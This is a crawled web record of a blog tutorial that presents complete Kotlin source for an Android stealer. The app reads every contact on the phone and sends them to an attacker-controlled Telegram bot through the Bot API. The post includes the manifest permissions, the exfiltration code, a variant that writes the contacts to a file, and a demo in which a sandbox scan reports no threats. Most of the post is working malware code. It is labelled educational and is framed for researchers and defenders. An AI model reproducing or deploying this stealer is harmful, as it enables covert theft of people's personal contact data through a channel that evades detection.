{
  "thread": {
    "uuid": "fba8524042cb28e46a404ede1dfa1edf75afa9e2",
    "url": "https://cocomelonc.github.io/android/2025/07/30/malware-android-2.html",
    "site_full": "cocomelonc.github.io",
    "site": "cocomelonc.github.io",
    "site_section": "https://cocomelonc.github.io/feed.xml",
    "site_categories": [],
    "section_title": "cocomelonc",
    "site_title": "Site not found &middot; GitHub Pages",
    "title": "Mobile malware development trick 2. Abuse Telegram Bot API: Contacts. Simple Android (Java/Kotlin) stealer example.",
    "title_full": "Mobile malware development trick 2. Abuse Telegram Bot API: Contacts. Simple Android (Java/Kotlin) stealer example.",
    "published": "2025-07-30T03:00:00.000+03:00",
    "replies_count": 0,
    "participants_count": 1,
    "site_type": "news",
    "country": "VN",
    "main_image": "https://cocomelonc.github.io/assets/images/168/2025-05-18_16-48.png",
    "performance_score": 0,
    "domain_rank": 45,
    "domain_rank_updated": "2025-06-03T00:00:00.000+03:00",
    "licensing_agency": [],
    "social": {
      "facebook": {
        "likes": 0,
        "comments": 0,
        "shares": 0
      },
      "vk": {
        "shares": 0
      }
    }
  },
  "uuid": "fba8524042cb28e46a404ede1dfa1edf75afa9e2",
  "url": "https://cocomelonc.github.io/android/2025/07/30/malware-android-2.html",
  "ord_in_thread": 0,
  "author": "cocomelonc",
  "published": "2025-07-30T03:00:00.000+03:00",
  "title": "Mobile malware development trick 2. Abuse Telegram Bot API: Contacts. Simple Android (Java/Kotlin) stealer example.",
  "text": "Mobile malware development trick 2. Abuse Telegram Bot API: Contacts. Simple Android (Java/Kotlin) stealer example.\n﷽\nThis post is based on section from my AIYA - Mobile malware development book, decided to add this to my blog so that everything would be in one place.\nIn this example, we will demonstrate how an attacker could abuse the Telegram Bot API to exfiltrate another sensitive information, such as contacts, from an infected Android device. The attacker uses OkHttp\nto send the stolen data as Telegram bot to chat ID (remote).\nThis tutorial will also highlight how adversaries can collect device information and contacts and send them to a Telegram bot using a combination of Android Contacts API, OkHttp, and Telegram Bot API.\npractical example\nIn this case, imagine that the adversary has already compromised an Android device. The malicious app installed on the device. Then collects contacts and device information. The app then sends this sensitive data to a Telegram Chat ID controlled by the attacker using OkHttp\n.\nYour project’s structure looks like there (HackContacts2\n):\nFirst of all add contacts permission to your manifest file:\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\nxmlns:tools=\"http://schemas.android.com/tools\">\n<uses-feature\nandroid:name=\"android.hardware.telephony\"\nandroid:required=\"false\" />\n<uses-permission android:name=\"android.permission.INTERNET\"/>\n<uses-permission android:name=\"android.permission.READ_CONTACTS\"/>\n<application\nandroid:allowBackup=\"true\"\nandroid:dataExtractionRules=\"@xml/data_extraction_rules\"\nandroid:fullBackupContent=\"@xml/backup_rules\"\nandroid:icon=\"@mipmap/ic_launcher\"\nandroid:label=\"@string/app_name\"\nandroid:roundIcon=\"@mipmap/ic_launcher_round\"\nandroid:supportsRtl=\"true\"\nandroid:theme=\"@style/Theme.HackContacts\"\ntools:targetApi=\"31\">\n<activity\nandroid:name=\".MainActivity\"\nandroid:exported=\"true\"\nandroid:label=\"@string/app_name\"\nandroid:theme=\"@style/Theme.HackContacts\">\n<intent-filter>\n<action android:name=\"android.intent.action.MAIN\" />\n<category android:name=\"android.intent.category.LAUNCHER\" />\n</intent-filter>\n</activity>\n</application>\n</manifest>\nThe components of the our malicious application: the app uses the Android Contacts Content Provider (ContactsContract\n) to fetch the user’s contacts, the app then sends the gathered data via an HTTP request via Telegram Bot API.\nAs the previous examples, we need the getContacts()\nfunction. This function queries the ContactsContract\ncontent provider to extract the contacts from the device. The extracted contact information (name and phone number) is added to the message that will be sent to the Telegram bot:\nfun getContacts(): String {\nval contactsList = mutableListOf<String>()\nval contentResolver = context.contentResolver\nval cursor = contentResolver.query(\nContactsContract.CommonDataKinds.Phone.CONTENT_URI,\nnull,\nnull,\nnull,\nnull\n)\ncursor?.use {\nval nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)\nval numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)\nwhile (it.moveToNext()) {\nval name = it.getString(nameIndex)\nval number = it.getString(numberIndex)\ncontactsList.add(\"$name: $number\")\n}\n}\nreturn contactsList.joinToString(separator = \"\\n\")\n}\nThen sends the retrieved contacts to an attacker-controlled Telegram Bot API using OkHttp:\n// function to send contacts using OkHttp\nfun sendContacts(message: String) {\nval token = getTokenFromAssets()\nval chatId = getChatIdFromAssets()\nval contacts = getContacts()\nval meow = \"Meow! ♥️\\uFE0F\"\nval messageToSend = \"$message\\n\\n$contacts\\n\\n$meow\\n\\n\"\nval requestBody = FormBody.Builder()\n.add(\"chat_id\", chatId)\n.add(\"text\", messageToSend)\n.build()\nval request = Request.Builder()\n.url(\"https://api.telegram.org/bot$token/sendMessage\")\n.post(requestBody)\n.build()\n// send the request asynchronously using OkHttp\nclient.newCall(request).enqueue(object : Callback {\noverride fun onFailure(call: Call, e: IOException) {\ne.printStackTrace()\n}\noverride fun onResponse(call: Call, response: Response) {\nif (response.isSuccessful) {\n// Handle success\nprintln(\"Message sent successfully: ${response.body?.string()}\")\n} else {\nprintln(\"Error: ${response.body?.string()}\")\n}\n}\n})\n}\nSo the full source code of the sending logic is looks like this HackContacts\n:\npackage com.example.hackcontacts2\nimport android.content.Context\nimport android.provider.ContactsContract\nimport okhttp3.*\nimport java.io.IOException\nclass HackContacts2(private val context: Context) {\nprivate val client = OkHttpClient()\n// function to send contacts to Telegram\nfun sendContacts() {\nval token = getTokenFromAssets()\nval chatId = getChatIdFromAssets()\nval contacts = getContacts() // fetch contacts\nval meow = \"Meow! ♥️\\uFE0F\"\nval messageToSend = \"$contacts\\n\\n$meow\\n\\n\"\n// create request body\nval requestBody = FormBody.Builder()\n.add(\"chat_id\", chatId)\n.add(\"text\", messageToSend)\n.build()\n// send request to Telegram API\nval request = Request.Builder()\n.url(\"https://api.telegram.org/bot$token/sendMessage\")\n.post(requestBody)\n.build()\n// Send request asynchronously\nclient.newCall(request).enqueue(object : Callback {\noverride fun onFailure(call: Call, e: IOException) {\ne.printStackTrace()\n}\noverride fun onResponse(call: Call, response: Response) {\nif (response.isSuccessful) {\nprintln(\"Message sent successfully: ${response.body?.string()}\")\n} else {\nprintln(\"Error: ${response.body?.string()}\")\n}\n}\n})\n}\n// function to fetch contacts\nfun getContacts(): String {\nval contactsList = mutableListOf<String>()\nval contentResolver = context.contentResolver\nval cursor = contentResolver.query(\nContactsContract.CommonDataKinds.Phone.CONTENT_URI,\nnull,\nnull,\nnull,\nnull\n)\ncursor?.use {\nval nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)\nval numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)\nwhile (it.moveToNext()) {\nval name = it.getString(nameIndex)\nval number = it.getString(numberIndex)\ncontactsList.add(\"$name: $number\")\n}\n}\nreturn contactsList.joinToString(separator = \"\\n\")\n}\n// fetch token and chatId from assets (assuming these are saved in files)\nprivate fun getTokenFromAssets(): String {\nreturn context.assets.open(\"token.txt\").bufferedReader().readText().trim()\n}\nprivate fun getChatIdFromAssets(): String {\nreturn context.assets.open(\"id.txt\").bufferedReader().readText().trim()\n}\n}\nAnd in the MainActivity\nwe just request permissions and send contacts via Telegram:\npackage com.example.hackcontacts2\nimport android.Manifest\nimport android.content.Context\nimport android.os.Bundle\nimport android.widget.Button\nimport android.widget.Toast\nimport androidx.activity.ComponentActivity\nimport com.karumi.dexter.Dexter\nimport com.karumi.dexter.PermissionToken\nimport com.karumi.dexter.listener.PermissionDeniedResponse\nimport com.karumi.dexter.listener.PermissionGrantedResponse\nimport com.karumi.dexter.listener.PermissionRequest\nimport com.karumi.dexter.listener.single.PermissionListener\nclass MainActivity : ComponentActivity() {\nprivate lateinit var meowButton: Button\nprivate val hackContacts = HackContacts2(context = this)\nprivate fun startContactsPermissionRequest(context: Context) {\nDexter.withContext(context)\n.withPermission(Manifest.permission.READ_CONTACTS)\n.withListener(object : PermissionListener {\noverride fun onPermissionGranted(p0: PermissionGrantedResponse?) {\nToast.makeText(\ncontext,\n\"Hack Contacts permission granted\",\nToast.LENGTH_SHORT\n).show()\n}\noverride fun onPermissionDenied(p0: PermissionDeniedResponse?) {\nToast.makeText(\ncontext,\n\"Hack Contacts permission denied\",\nToast.LENGTH_SHORT\n).show()\n}\noverride fun onPermissionRationaleShouldBeShown(\np0: PermissionRequest?,\np1: PermissionToken?\n) {\n}\n}).check()\n}\noverride fun onCreate(savedInstanceState: Bundle?) {\nsuper.onCreate(savedInstanceState)\nsetContentView(R.layout.activity_main)\nstartContactsPermissionRequest(this)\nmeowButton = findViewById(R.id.meowButton)\nmeowButton.setOnClickListener {\nhackContacts.sendContacts()\n}\n}\n}\nSo in this scenario, the malicious app on an infected Android device abuses Telegram’s Bot API to exfiltrate contacts. Once the READ_CONTACTS\npermission is granted, the app:\n-\nfetches contacts from the device using Android’s Contacts Content Provider.\n-\nformats the contacts into a string and appends a custom message (e.g., “Meow! ♥️”).\n-\nsends the contacts to the attacker-controlled Telegram bot via OkHttp by making a POST request via the Telegram Bot API.\ndemo\nLet’s go to see this in action.\nRun in the emulator:\nThen click Meow\nbutton:\nAlso install and check on the real device:\nJust click Meow\nbutton:\nAs you can see everything is wokred perfectly! =^..^=\nOf course in the real scenario with the real device, you need to create file with list of contacts, something like this:\nprivate fun createTempFile(prefix: String, suffix: String): File {\nval parent = File(System.getProperty(\"java.io.tmpdir\")!!)\nval temp = File(parent, prefix + suffix)\nif (temp.exists()) {\ntemp.delete()\n}\ntry {\ntemp.createNewFile()\n} catch (ex: IOException) {\nex.printStackTrace()\n}\nreturn temp\n}\nprivate fun getContacts() {\nval contactsList = mutableListOf<String>()\nval contactsListFile = createTempFile(\"Contacts\", \".txt\")\nval contentResolver = context.contentResolver\nval cursor = contentResolver.query(\nContactsContract.CommonDataKinds.Phone.CONTENT_URI,\nnull,\nnull,\nnull,\nnull\n)\ncursor?.use {\nval nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)\nval numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)\nwhile (it.moveToNext()) {\nval name = it.getString(nameIndex)\nval number = it.getString(numberIndex)\ncontactsList.add(\"$name: $number\")\n}\n}\n// join all contacts into a big single text\nval contactsText = contactsList.joinToString(separator = \"\\n\")\nif (contactsText.isNotEmpty()) {\nHackContacts2(context).saveAndSendFile(contactsListFile, contactsText)\n} else {\nHackContacts2(context).sendTextMessage(\"no contacts found.\")\n} // something like this, you need to create function for sending msg\n}\nUpload this application to ANY.RUN. First of all, we need to choose Android device for analysis:\nThen just wait:\nAs you can see the sandbox allows the requested permission during testing.\nThen:\nAs you can see, everything is worked as expected, we see that our message is successfully sent to Telegram server.\nANY.RUN says: No threats found\nBut:\nalso, ANY.RUN says: “Process communicates with Telegram (possibly using it as an attacker’s C2 server) (T1102)\nGreat!!!\nThis is a practical example for Android developers, malware researchers, blue teamers, red teamers, and threat hunters to understand how Telegram or other legitimate services could be used by adversaries to bypass detection and steal information.\nThanks to ANY.RUN for API!\nThis is a practical case for educational purposes only.\nThanks for your time happy hacking and good bye!\nPS. All drawings and screenshots are mine",
  "highlightText": "",
  "highlightTitle": "",
  "highlightThreadTitle": "",
  "language": "english",
  "sentiment": "negative",
  "categories": [
    "Crime, Law and Justice",
    "Science and Technology",
    "Social Issue"
  ],
  "topics": [
    "Science and Technology->biomedical science",
    "Science and Technology->information technology and computer science",
    "Science and Technology->technology and engineering",
    "Social Issue->discrimination",
    "Social Issue->social problem",
    "Social Issue->social networking"
  ],
  "ai_allow": true,
  "has_canonical": false,
  "breaking": null,
  "webz_reporter": false,
  "external_links": [
    "https://app.any.run/",
    "https://www.app.any.run/",
    "https://app.any.run"
  ],
  "external_images": [],
  "internal_images": [],
  "entities": {
    "persons": [],
    "locations": [],
    "organizations": [
      {
        "name": "AIYA",
        "sentiment": "none",
        "tickers": []
      }
    ]
  },
  "syndication": {
    "syndicated": false,
    "syndicate_id": null,
    "first_syndicated": false
  },
  "trust": {
    "categories": [],
    "top_news": [],
    "bias": null,
    "source": {
      "type": null,
      "city": null,
      "state": null,
      "country": null,
      "domain_type": null,
      "agency": null,
      "organization_name": null
    }
  },
  "rating": null,
  "crawled": "2025-08-14T09:55:19.618+03:00",
  "updated": "2025-08-14T10:00:00.000+03:00"
}